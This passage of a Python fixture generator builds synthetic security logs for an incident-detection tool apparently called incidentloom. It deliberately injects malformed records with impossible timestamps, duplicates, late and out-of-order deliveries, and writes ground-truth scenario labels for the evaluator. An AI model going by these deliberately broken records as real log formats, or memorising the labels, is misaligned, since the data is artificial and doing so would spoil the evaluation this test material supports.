        (20, "Oct 32 25:61:00 fh-db-01 sshd[1234]: Accepted publickey for piet.morrow from 192.0.2.33 port 50000 ssh2"),
    ],
    ("2026-10-14", "cloud_audit"): [
        (
            5,
            '{"eventId":"ca-990003","deliveryId":"dlv-0badf00f","actor":{"principal":"svc-ci","type":"service"},'
            '"operation":"compute.instance.deploy","target":{"type":"instance","name":"fh-web-01"},"outcome":"success"}',
        ),
        (18, '"TRUNCATED-RECORD"'),
    ],
    ("2026-10-15", "idp_signin"): [
        (
            40,
            '{"id":"idp-990004","delivery_id":"dlv-0badf010","ts":"2026-10-15T25:61:00Z","event_type":"signin",'
            '"user":"jun.okarra","ip":"192.0.2.31","app":"mail","result":"success"}',
        ),
    ],
    ("2026-10-15", "resource_access"): [
        (6, "rs-990005,dlv-0badf011,1792051200000,jun.okarra,share/fh-eng-docs/a.txt,read,100"),
        (15, "rs-990006,dlv-0badf012,abc,jun.okarra,share/fh-eng-docs/b.txt,read,100,192.0.2.31,,req-0,ok"),
        (24, "rs-990007,dlv-0badf013,1792060000000,,share/fh-eng-docs/c.txt,read,100,192.0.2.31,,req-0,ok"),
    ],
    ("2026-10-16", "idp_signin"): [
        (
            22,
            '{"id":"idp-990008","delivery_id":"dlv-0badf014","ts":"2026-10-16T08:00:00","event_type":"signin",'
            '"user":"kai.thornwick","ip":"192.0.2.27","app":"wiki","result":"success"}',
        ),
    ],
    ("2026-10-17", "cloud_audit"): [
        (
            9,
            '{"eventId":"ca-990009","deliveryId":"dlv-0badf015","eventTime":"yesterday","actor":{"principal":'
            '"piet.morrow","type":"user"},"operation":"compute.instance.resize","target":{"type":"instance",'
            '"name":"fh-db-01"},"outcome":"success"}',
        ),
    ],
    ("2026-10-18", "resource_access"): [
        (
            11,
            "rs-990010,dlv-0badf016,1792310400000,svc-ci,bucket/fh-builds/a.tgz,write,1024,192.0.2.42,,req-1,ok,"
            "auth_token=fake0000placeholder0000",
        ),
    ],
}


def assemble(gen: Generator) -> dict[tuple[str, str], list[dict[str, Any]]]:
    """Group records into (batch, source) files and apply duplicates, late arrivals and disorder."""
    files: dict[tuple[str, str], list[dict[str, Any]]] = {(b, s["name"]): [] for b in BATCH_IDS for s in SOURCES}
    for item in gen.recs:
        files[(item["batch"], item["src"])].append(item)
    for key in files:
        files[key].sort(key=lambda i: (i["t"], record_key(i)))
    d13, d14, d15, d16, d17, d18 = BATCH_IDS

    def move_tail(src: str, frm: str, to: str, n: int) -> None:
        tail = [i for i in files[(frm, src)] if i["scn"] is None][-n:]
        for item in tail:
            files[(frm, src)].remove(item)
            item["batch"] = to
        files[(to, src)][:0] = tail

    move_tail("cloud_audit", d15, d16, 3)
    move_tail("idp_signin", d16, d17, 2)

    def dup_after(key: tuple[str, str], picks: list[dict[str, Any]], redelivered_to: str | None = None) -> None:
        for item in picks:
            if redelivered_to:
                files[(redelivered_to, key[1])].append(redeliver(item, gen, redelivered_to))
            else:
                lst = files[key]
                lst.insert(lst.index(item) + 1, dict(item))

    idp14 = files[(d14, "idp_signin")]
    sela = [
        i
        for i in idp14
        if i["scn"] == "dev-04" and i["rec"]["ip"] == "198.51.100.70" and i["rec"]["event_type"] == "signin"
    ]
    dup_after((d14, "idp_signin"), sela + [i for i in idp14 if i["scn"] is None][5:8])
    idp15 = files[(d15, "idp_signin")]
    mira = [i for i in idp15 if i["scn"] == "ho-02"][:2]
    dup_after((d15, "idp_signin"), mira + [i for i in idp15 if i["scn"] is None][10:13], redelivered_to=d16)
    res14 = files[(d14, "resource_access")]
    for item in [i for i in res14 if i["scn"] is None][4:6]:
        res14.insert(res14.index(item) + 1, redeliver(item, gen, d14))
    host15 = files[(d15, "host_auth")]
    dup_after((d15, "host_auth"), [i for i in host15 if i["scn"] is None][7:9])
    res17 = files[(d17, "resource_access")]
    dup_after((d17, "resource_access"), [i for i in res17 if i["scn"] == "ho-07"][10:13])
    cloud16 = files[(d16, "cloud_audit")]
    picks = [i for i in cloud16 if i["scn"] == "ho-04"] + [i for i in cloud16 if i["scn"] is None][8:10]
    dup_after((d16, "cloud_audit"), picks, redelivered_to=d17)
    res18 = files[(d18, "resource_access")]
    for k in (6, 14, 21):  # deliver a few rows out of order inside the file
        res18[k], res18[k + 1] = res18[k + 1], res18[k]
    return files


def generate(out: Path) -> dict[str, Any]:
    gen = Generator()
    gen.build_scenarios()
    gen.build_background()
    files = assemble(gen)
    labels: dict[str, dict[str, Any]] = {sid: {**meta, "events": []} for sid, meta in gen.scenarios.items()}
    written: list[str] = []
    for batch in BATCH_IDS:
        bdir = out / "batches" / batch
        bdir.mkdir(parents=True, exist_ok=True)
        manifest_sources = []
        for spec in SOURCES:
            items = files[(batch, spec["name"])]
            lines = [render_record(i) for i in items]
            for item in items:
                if item["scn"]:
                    eid = event_id(spec["name"], record_key(item))
                    if eid not in labels[item["scn"]]["events"]:
                        labels[item["scn"]]["events"].append(eid)
            for pos, raw in MALFORMED.get((batch, spec["name"]), []):
                lines.insert(min(pos, len(lines)), raw)
            path = bdir / spec["file"]
            if spec["format"] == "json":
                text = '{"records":[\n' + ",\n".join(lines) + "\n]}\n"
            elif spec["format"] == "csv":
                text = ",".join(RESOURCE_COLUMNS) + "\n" + "\n".join(lines) + "\n"
            else:
                text = "\n".join(lines) + "\n"
            path.write_bytes(text.encode("ascii"))
            written.append(path.as_posix())
            start = at(batch, "00:00:00")
            manifest_sources.append({**spec, "coverage": [iso_cov(start), iso_cov(start + 24 * HOUR)]})
        gaps = []
        if batch == "2026-10-14":
            gaps.append(
                {
                    "source": "host_auth",
                    "start": "2026-10-14T13:45:00Z",
                    "end": "2026-10-14T16:15:00Z",
                    "reason": "endpoint log forwarder restarted; records in this window were not retained",
                }
            )
        manifest = {
            "batch": batch,
            "organisation": ORG,
            "synthetic": True,
            "sources": manifest_sources,
            "declared_gaps": gaps,
            "notes": "declared_clock_offset_seconds is the source clock minus true UTC; the corrected time "
            "is the parsed time minus the offset. Coverage and declared gaps are in true UTC.",
        }
        (bdir / "batch.json").write_text(json.dumps(manifest, indent=2, sort_keys=True) + "\n", encoding="ascii")
    for meta in labels.values():
        meta["events"].sort()
    label_doc = {
        "synthetic": True,
        "note": "Synthetic labels written by the fixture generator. Read only by incidentloom.evaluate; "
        "detection code never opens this file. Thresholds were chosen on the development split.",
        "scenarios": labels,
    }
    (out / "labels").mkdir(parents=True, exist_ok=True)
    (out / "labels" / "scenarios.json").write_text(
        json.dumps(label_doc, indent=2, sort_keys=True) + "\n", encoding="ascii"
    )
    (out / "reference").mkdir(parents=True, exist_ok=True)
    (out / "reference" / "geo.json").write_text(json.dumps(GEO, indent=2, sort_keys=True) + "\n", encoding="ascii")
    return {"source_files": len(written), "records": len(gen.recs), "scenarios": len(labels)}


def iso_cov(ms: int) -> str:
    return dt_from_ms(ms).strftime("%Y-%m-%dT%H:%M:%SZ")
